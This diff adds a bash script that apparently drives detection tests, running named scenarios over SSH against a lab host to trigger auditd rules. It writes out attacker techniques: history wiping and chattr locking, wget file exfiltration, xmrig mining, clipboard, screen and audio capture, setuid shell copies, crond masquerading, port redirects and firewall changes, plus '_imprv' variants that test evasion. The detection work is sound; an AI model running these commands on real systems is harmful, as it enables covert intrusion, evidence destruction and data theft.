@@ -1,0 +1,1110 @@
+#!/bin/bash
+
+%TODO:
+
+
+# SSH_PARAM=""
+# HOST=alice@$VICTIM_HOST
+# ROOT_HOST=root@$VICTIM_HOST
+
+temp_file_home="/home/alice/mal"
+# hidden_file_home="/home/alice/.mal"
+
+usage() { echo "Usage: $0 -s scenario_name " 1>&2; exit 1; }
+
+
+if [[ -z "${s}" ]]; then
+    usage
+fi
+
+
+
+
+if [[ ${s} == "lnx_auditd_user_discovery" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    users; \
+    who; \
+    w; \
+    '
+fi
+
+if [[ ${s} == "lnx_auditd_user_discovery_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    /usr/bin/users
+    /usr/bin/who
+    /usr/bin/w
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_system_shutdown_reboot" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "echo PERFROM SHUTDOWN MANUALLY"
+fi
+
+
+if [[ ${s} == "lnx_auditd_auditing_config_change" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    cat /etc/audit/audit.rules; \
+    cat /etc/libaudit.conf; \
+    cat /etc/audisp/hello.txt; \
+    '
+fi
+
+
+if [[ ${s} == "lnx_auditd_auditing_config_change_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cd /etc/
+    cp audit/audit.rules /tmp/sss
+    cat /tmp/sss
+    cat /etc
+    cat libaudit.conf
+    cd /etc
+    cat audisp/hello.txt
+    "
+fi
+
+
+if [[ ${s} == "dir_change_test" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cat ~/test
+    "
+fi
+
+if [[ ${s} == "dir_change_test_masked" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cp ~/test /tmp/hidden
+    cat /tmp/hidden
+    "
+fi
+
+
+
+
+
+
+if [[ ${s} == "lnx_auditd_auditing_config_change_changed__" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cd /etc/
+    cp audit/audit.rules /tmp/sss
+    cat /tmp/sss
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_bpfdoor_port_redirect" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 2527 -j REDIRECT --to-port 42
+    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 2527 -j REDIRECT --to-port 43 
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_bpfdoor_port_redirect_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    iptables -A PREROUTING  -t nat -i eth0 -p tcp --dport 2527 -j REDIRECT --to-port 42
+    iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 2527 -j REDIRECT --to-port 43 
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_bpfdoor_port_redirect_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    iptables -A PREROUTING  -t nat -i eth0 -p tcp --dport 2527 -j REDIRECT --to-port 42
+    iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 2527 -j REDIRECT --to-port 43 
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_capabilities_discovery" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    getcap -r / 2>/dev/null
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_capabilities_discovery_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    getcap -n -r / 2>/dev/null
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_capabilities_discovery_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    getcap -n -r / 2>/dev/null
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_change_file_time_attr" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+        touch $temp_file_home
+
+        touch -t 01010830 $temp_file_home
+        touch -d "01010830" $temp_file_home
+        touch -r /bin/bash $temp_file_home
+        touch -acmr /bin/bash $temp_file_home
+
+        rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_clipboard_collection" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    xclip -selection clipboard -o 
+    xclip -sel clipboard -o 
+    xclip -selection clip -o 
+    xclip -sel clip -o 
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_clipboard_collection_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    xclip -o -selection clipboard
+    xclip -o -sel clipboard
+    xclip -o -selection clip 
+    xclip -o -sel clip
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_clipboard_collection_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    xclip -o -selection clipboard
+    xclip -o -sel clipboard
+    xclip -o -selection clip 
+    xclip -o -sel clip
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_create_account" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    /usr/sbin/useradd test
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_create_account_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    /usr/sbin/useradd --badnames test
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_create_account_root" ]]; then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $ROOT_HOST -t '\
+    /usr/sbin/useradd test
+    '
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_data_compressed" ]];then
+	echo "Executing scenario ${s}... "
+
+    # echo $HOST
+	ssh $SSH_PARAM $HOST -t " \
+        touch $temp_file_home
+        zip $temp_file_home.zip $temp_file_home
+        mkdir ${temp_file_home}_folder
+
+        gzip -f $temp_file_home
+        tar -cvzf  ${temp_file_home}_folder.tar ${temp_file_home}_folder
+
+        rm $temp_file_home.zip
+        # rm $temp_file_home.gz
+        rmdir ${temp_file_home}_folder
+        rm ${temp_file_home}_folder.tar
+        # rm ${temp_file_home}folder.tar
+        rmdir ${temp_file_home}folder
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_data_compressed_imprv" ]];then
+	echo "Executing scenario ${s}... "
+
+	ssh $SSH_PARAM $HOST -t " \
+        touch $temp_file_home
+        mkdir ${temp_file_home}_folder
+
+        /usr/bin/zip $temp_file_home.zip  $temp_file_home
+        gzip  -k -f   $temp_file_home
+        tar -vc -zf  ${temp_file_home}_folder.tar   ${temp_file_home}_folder
+
+        rm $temp_file_home.zip
+        rm $temp_file_home.gz
+        rmdir ${temp_file_home}_folder
+        rm ${temp_file_home}_folder.tar
+    "
+fi
+
+
+
+
+if [[ ${s} == "lnx_auditd_file_or_folder_permissions" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+        touch $temp_file_home
+
+        chmod o+r $temp_file_home
+        chown alice:alice $temp_file_home
+
+        rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_find_cred_in_files" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    cat /etc/passwd | grep root 
+    '
+fi
+
+
+if [[ ${s} == "lnx_auditd_susp_cmds" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+        touch $temp_file_home
+
+        chmod 777 $temp_file_home
+        chmod u+s $temp_file_home
+        /usr/bin/cp /bin/sh /home/alice/sh
+        /usr/bin/cp /bin/sh /home/alice/sh
+
+        rm $temp_file_home
+        rm /home/alice/sh
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_susp_cmds_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+        touch $temp_file_home
+
+        /usr/bin/chmod 777 $temp_file_home
+        /usr/bin/chmod u+s $temp_file_home
+        cp /bin/sh /home/alice/sh
+        cp /bin/sh /home/alice/sh
+
+        rm $temp_file_home
+        rm /home/alice/sh
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_susp_exe_folders_old" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    echo "Malic" > /tmp/mal ;\
+    cp /bin/cat /tmp/dog ;\
+    /tmp/dog /tmp/mal ;\
+    /var/www/cat /tmp/mal ;\
+    ~/public_html/cat /tmp/mal ;\ 
+    /usr/local/apache2/cat /tmp/mal ;\
+    /var/lib/mysql/cat /tmp/mal
+    '
+fi
+
+if [[ ${s} == "lnx_auditd_susp_exe_folders" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    echo "Malic" > /tmp/mal 
+
+    cp /bin/cat /tmp/
+    /tmp/cat /tmp/mal
+    /var/www/cat /tmp/mal
+    /home/www/cat /tmp/mal
+    ~/public_html/cat /tmp/mal
+    /usr/local/apache2/cat /tmp/mal
+    /usr/local/httpd/cat /tmp/mal
+    /var/lib/mysql/cat /tmp/mal
+    /var/apache/cat /tmp/mal
+    /srv/www/cat /tmp/mal
+    /home/httpd/html/cat /tmp/mal
+    /srv/http/cat /tmp/mal
+    /usr/share/nginx/html/cat /tmp/mal
+    /var/lib/pgsql/data/cat /tmp/mal
+    /usr/local/mysql/data/cat /tmp/mal
+    /var/lib/mysql/cat /tmp/mal
+    /var/vsftpd/cat /tmp/mal
+    /etc/bind/cat /tmp/mal
+    /var/named/cat /tmp/mal
+
+    rm /tmp/mal
+    "
+fi
+
+
+
+
+#this is bad, we can not catch this in auditd
+if [[ ${s} == "lnx_shell_clear_cmd_history" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    rm ~/.bash_history; \
+    echo "" > *bash_history; \
+    cat /dev/null > ~/.bash_history; \
+    # cat /dev/zero > ~/.bash_history; \ we have to tell a size
+    ln -sf /dev/null ~/.bash_history; \
+    ln -sf /dev/zero ~/.bash_history; \
+    truncate -s0 ~/.bash_history; \
+    export HISTFILESIZE=0; \
+    history -c; \
+    history -w; \
+   # shred ~/.bash_history; \
+   # empty_bash_history; \ this is some command
+    chattr +i ~/.bash_history; 
+    '
+fi
+
+
+
+
+if [[ ${s} == "lnx_auditd_dd_delete_file" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    touch $temp_file_home
+
+    dd if=/dev/null of=$temp_file_home
+
+    touch $temp_file_home
+    dd if=/dev/zero of=$temp_file_home count=1; \
+
+    rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_password_policy_discovery" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    chage -l alice
+    chage --list alice
+    passwd -S alice
+    passwd --status alice
+    chage -l root
+    chage --list root
+    passwd -S root
+    passwd --status root
+
+    cat /etc/pam.d/common-password
+    cat /etc/security/pwquality.conf
+    cat /etc/pam.d/system-auth
+    cat /etc/login.defs
+    '
+fi
+
+if [[ ${s} == "lnx_auditd_password_policy_discovery_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    /usr/bin/chage -l alice
+    /usr/bin/chage --list alice
+    /usr/bin/passwd -S alice
+    /usr/bin/passwd --status alice
+    /usr/bin/chage -l root
+    /usr/bin/chage --list root
+    /usr/bin/passwd -S root
+    /usr/bin/passwd --status root
+
+    cat /etc/pam.d/common-password
+    cat /etc/security/pwquality.conf
+    cat /etc/pam.d/system-auth
+    cat /etc/login.defs
+    '
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_audio_capture" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    arecord -vv -fdat /tmp/recorcding
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_audio_capture_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    arecord -vv -fcd /tmp/recorcding
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_system_info_discovery" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cat /etc/issue ;\
+    cat /etc/lsb-release ;\
+    cat /etc/redhat-release ;\
+    uname ;\
+    uptime ;\
+    lsmod ;\
+    hostname ;\
+    env ;\
+    cat /proc/scsi/scsi | grep -i "vmware\|vbox" ;\
+    lsmod | grep xen  ;\
+    lsmod | grep virtio ;\
+    lsmod | grep hv ;\
+    kmod list 
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_system_info_discovery_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cat /etc/issue 
+    cat /etc/lsb-release 
+    cat /etc/redhat-release 
+    /usr/bin/uname
+    /usr/bin/uptime
+    /usr/sbin/lsmod
+    /usr/bin/hostname
+    /usr/bin/env
+    cat /proc/scsi/scsi | grep -i "vmware\|vbox" 
+    lsmod | grep xen  
+    lsmod | grep virtio 
+    lsmod | grep hv 
+    /usr/bin/kmod list 
+    "
+fi
+
+
+if [[ ${s} == 0 ]];then
+	echo "Executing scenario 0 ... "
+	ssh $SSH_PARAM $HOST -t 'which docker'
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_binary_padding" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    touch $temp_file_home
+
+    dd if=/dev/zero bs=1 count=1 >> $temp_file_home
+    truncate -s +1 $temp_file_home
+
+    rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_binary_padding_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    touch $temp_file_home
+
+    dd if=/dev/zero bs=1 count=1 >> $temp_file_home
+    truncate -s +1 $temp_file_home
+
+    rm $temp_file_home
+    "
+fi
+
+
+
+
+if [[ ${s} == "lnx_auditd_bpfdoor_file_accessed" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t '\
+    cat /var/run/haldrund.pid ; \
+    cat /var/run/xinetd.lock ; \
+    cat /var/run/kdevrund.pid
+    '
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_chattr_immutable_removal" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home ; \
+
+    chattr -i $temp_file_home ; \
+
+    rm $temp_file_home"
+fi
+
+if [[ ${s} == "lnx_auditd_chattr_immutable_removal_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home ; \
+
+    chattr -v -i $temp_file_home ; \
+
+    rm $temp_file_home"
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_clipboard_image_collection" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    xclip -selection clipboard -t image/png -o > $temp_file_home ; \
+    xclip -sel clipboard -t image/png -o > $temp_file_home ; \
+    xclip -selection clip -t image/png -o > $temp_file_home ; \
+    xclip -sel clip -t image/png -o > $temp_file_home ; \
+
+    rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_clipboard_image_collection_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    xclip -selection clipboard -o -t image/png  > $temp_file_home
+    xclip -sel clipboard -o -t image/png > $temp_file_home
+    xclip -selection clip -o -t image/png  > $temp_file_home
+    xclip -sel clip -o -t image/png  > $temp_file_home
+
+
+ rm $temp_file_home
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_clipboard_image_collection_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    xclip -selection clipboard -o -t image/png  > $temp_file_home
+    xclip -sel clipboard -o -t image/png > $temp_file_home
+    xclip -selection clip -o -t image/png  > $temp_file_home
+    xclip -sel clip -o -t image/png  > $temp_file_home
+
+
+    rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_clipboard_image_collection_d" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    xclip -sel    clip -o -t   image/jpg  > $temp_file_home
+
+    rm $temp_file_home
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_coinminer" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    xmrig --cpu-priority
+    xmrig blank --cpu-priority
+    xmrig blank blank --cpu-priority
+    xmrig blank blank blank --cpu-priority
+    xmrig blank blank blank blank --cpu-priority
+    xmrig blank blank blank blank blank --cpu-priority
+    xmrig blank blank blank blank blank blank --cpu-priority
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_data_exfil_wget" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    echo "Hi" > $temp_file_home 
+    wget --post-file=$temp_file_home https://0.0.0.0
+
+    rm $temp_file_home
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_data_exfil_wget_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    echo "Hi" > $temp_file_home 
+    wget --verbose --post-file=$temp_file_home https://0.0.0.0
+
+    rm $temp_file_home
+    "
+fi
+
+
+
+
+if [[ ${s} == "lnx_auditd_hidden_binary_execution" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cat ~/.bashrc 
+    cat ~/.config/config 
+    cat ~/.pyenv/test
+    cat ~/.rustup/toolchain 
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_hidden_files_directories" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    mkdir ~/.mal
+    touch ~/.mal/mal
+
+    rm ~/.mal/mal
+    rmdir ~/.mal
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_hidden_files_directories_c" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    cd ~/.config
+    touch config
+    "
+fi
+
+
+
+
+if [[ ${s} == "lnx_auditd_hidden_files_directories_broken" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "
+    mkdir ~/.mal
+    rmdir ~/.mal
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_hidden_zip_files_steganography" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home
+    zip $temp_file_home.zip $temp_file_home
+    convert -size 32x32 xc:white $temp_file_home.jpg
+    convert $temp_file_home.jpg $temp_file_home.png
+
+
+    cat $temp_file_home.jpg $temp_file_home.zip
+    cat $temp_file_home.png $temp_file_home.zip
+
+    rm $temp_file_home*
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_hidden_zip_files_steganography_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home
+
+    zip $temp_file_home.zip $temp_file_home
+    convert -size 32x32 xc:white $temp_file_home.jpg
+    convert $temp_file_home.jpg $temp_file_home.png
+
+
+    /usr/bin/cat -u $temp_file_home.jpg $temp_file_home.zip
+    /usr/bin/cat -u $temp_file_home.png $temp_file_home.zip
+
+    rm $temp_file_home*
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_keylogging_with_pam_d" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    cat /etc/pam.d/system-auth
+    cat /etc/pam.d/password-auth
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_ld_so_preload_mod" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    cat /etc/ld.so.preload
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_load_module_insmod" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    insmod /usr/lib/modules/5.15.0-83-generic/kernel/fs/nfs/nfs.ko
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_logging_config_change" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+        cat /etc/syslog.conf
+        cat /etc/rsyslog.conf
+        cat /etc/syslog-ng/syslog-ng.conf
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_masquerading_crond" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    cp -i /bin/sh /home/alice/crond
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_masquerading_crond_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    /usr/bin/cp -i /bin/sh /home/alice/crond
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_modify_system_firewall" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+     iptables -A INPUT -s 203.0.113.51 -j DROP
+     firewall-cmd --permanent --zone=external --remove-port=60001/udp
+     ufw delete 1
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_modify_system_firewall_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+     /usr/sbin/iptables -A INPUT -s 203.0.113.51 -j DROP
+     /usr/bin/firewall-cmd --permanent --zone=external --remove-port=60001/udp
+     /usr/sbin/ufw delete 1
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_network_service_scanning" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    telnet localhost 80
+    nmap -F localhost
+    nc -nv localhost 80
+    netcat -nv localhost 80
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_network_sniffing" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    tcpdump -c 10 -i eth0
+    tshark -c 10 -i eth0
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_network_sniffing_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    /usr/bin/tcpdump -c 10 -i eth0
+    /usr/bin/tshark -c 10 -i eth0
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_omigod_scx_runasprovider_executeshellcommand" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $ROOT_HOST -t "\
+    cd /var/opt/microsoft/scx/tmp && sh -c 'echo hi'
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_pers_systemd_reload" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    systemctl start auditd
+    systemctl daemon-reload
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_screencapture_import" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    #has to be done interactively..
+
+    import -window root $temp_file_home.png
+    import -window root $temp_file_home.jpg
+    import -window root $temp_file_home.jpeg
+
+
+
+    import $temp_file_home.png
+    import $temp_file_home.jpg
+    import $temp_file_home.jpeg
+
+    rm $temp_file_home.png
+    rm $temp_file_home.jpg
+    rm $temp_file_home.jpeg
+
+    "
+    read -n 1 -p Continue?;
+    
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_screencapture_import_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    #has to be done interactively..
+
+    /usr/bin/import -window root $temp_file_home.png
+    /usr/bin/import -window root $temp_file_home.jpg
+    /usr/bin/import -window root $temp_file_home.jpeg
+
+
+    /usr/bin/import $temp_file_home.png
+    /usr/bin/import $temp_file_home.jpg
+    /usr/bin/import $temp_file_home.jpeg
+
+    rm $temp_file_home.png
+    rm $temp_file_home.jpg
+    rm $temp_file_home.jpeg
+    "
+    read -n 1 -p Continue?;
+    
+fi
+
+
+if [[ ${s} == "lnx_auditd_screencaputre_xwd" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    #has to be done interactively..
+    xwd -root -out  $temp_file_home.xwd
+    xwd -out $temp_file_home.xwd
+
+    rm $temp_file_home.xwd
+    "
+    read -n 1 -p Continue?;
+    
+fi
+
+if [[ ${s} == "lnx_auditd_screencaputre_xwd_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    #has to be done interactively..
+
+    /usr/bin/xwd -root -out  $temp_file_home.xwd
+    /usr/bin/xwd -out $temp_file_home.xwd
+
+    rm $temp_file_home.xwd
+    "
+    read -n 1 -p Continue?;
+    
+fi
+
+
+if [[ ${s} == "lnx_auditd_split_file_into_pieces" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home
+
+    split -b 50000  $temp_file_home
+
+    rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_steghide_embed_steganography_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home
+
+    convert -size 1032x1032 xc:white $temp_file_home.jpg
+
+    /usr/bin/steghide embed -ef $temp_file_home -cf  $temp_file_home.jpg
+    /usr/bin/steghide embed -cf $temp_file_home.jpg -ef  $temp_file_home
+
+    rm $temp_file_home
+    rm $temp_file_home.jpg
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_steghide_embed_steganography" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    touch $temp_file_home
+
+    convert -size 1032x1032 xc:white $temp_file_home.jpg
+
+    steghide embed -ef $temp_file_home -cf  $temp_file_home.jpg
+    steghide embed -cf $temp_file_home.jpg -ef  $temp_file_home
+
+    rm $temp_file_home
+    rm $temp_file_home.jpg
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_steghide_extract_steganography" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+
+    touch $temp_file_home
+
+    convert -size 1032x1032 xc:white $temp_file_home.jpg
+
+    steghide embed -ef $temp_file_home -cf  $temp_file_home.jpg
+
+    rm $temp_file_home
+    steghide extract -sf $temp_file_home.jpg
+
+    rm $temp_file_home
+    rm $temp_file_home.jpg
+    
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_steghide_extract_steganography_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+
+    touch $temp_file_home
+
+    convert -size 1032x1032 xc:white $temp_file_home.jpg
+
+    /usr/bin/steghide embed -ef $temp_file_home -cf  $temp_file_home.jpg
+
+    rm $temp_file_home
+    /usr/bin/steghide extract -sf $temp_file_home.jpg
+
+    rm $temp_file_home
+    rm $temp_file_home.jpg
+    
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_susp_histfile_operations" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    cat ~/.bash_history
+    cat ~/.zsh_history
+    cat ~/.zhistory
+    cat ~/.history
+    cat ~/.sh_history
+    cat fish_history
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_system_info_discovery2" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    cat /sys/class/dmi/id/bios_version
+    cat /sys/class/dmi/id/product_name
+    cat /sys/class/dmi/id/chassis_vendor
+    cat /proc/scsi/scsi
+    cat /proc/ide/hd0/model
+    cat /proc/version
+    cat /etc/debian_version
+    cat /etc/*version
+    cat /etc/*release
+    cat /etc/issue
+    "
+fi
+
+
+
+if [[ ${s} == "lnx_auditd_systemd_service_creation" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $ROOT_HOST -t "
+    echo new_service1 >  /usr/lib/systemd/system/mal.service
+    echo new_service2 > /etc/systemd/system/mal.service
+    echo new_user_service > /home/alice/.config/systemd/user/user_service
+
+    rm /usr/lib/systemd/system/mal.service
+    rm /etc/systemd/system/mal.service
+    rm /home/alice/.config/systemd/user/user_service
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_unzip_hidden_zip_files_steganography" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    convert -size 32x32 xc:white $temp_file_home.jpg
+    unzip $temp_file_home.jpg 
+
+    rm $temp_file_home
+    "
+fi
+
+if [[ ${s} == "lnx_auditd_unzip_hidden_zip_files_steganography_imprv" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $HOST -t "\
+    convert -size 32x32 xc:white $temp_file_home.jpg
+    /usr/bin/unzip $temp_file_home.jpg 
+
+    rm $temp_file_home
+    "
+fi
+
+
+if [[ ${s} == "lnx_auditd_unix_shell_configuration_modification" ]];then
+	echo "Executing scenario ${s}... "
+	ssh $SSH_PARAM $ROOT_HOST -t "\
+    cat /etc/shells
+    cat /etc/profile
+    cat /etc/profile.d/bash_completion.sh
+    cat /etc/bash.bashrc
+    cat /etc/bashrc
+    cat /etc/zsh/zprofile
+    cat /etc/zsh/zshrc
+    cat /etc/zsh/zlogin
+    cat /etc/zsh/zlogout
+    cat /etc/csh.cshrc
+    cat /etc/csh.login
+    cat /root/.bashrc
+    cat /root/.bash_profile
+    cat /root/.profile
+    cat /root/.zshrc
+    cat /root/.zprofile
+    cat /home/alice/.bashrc
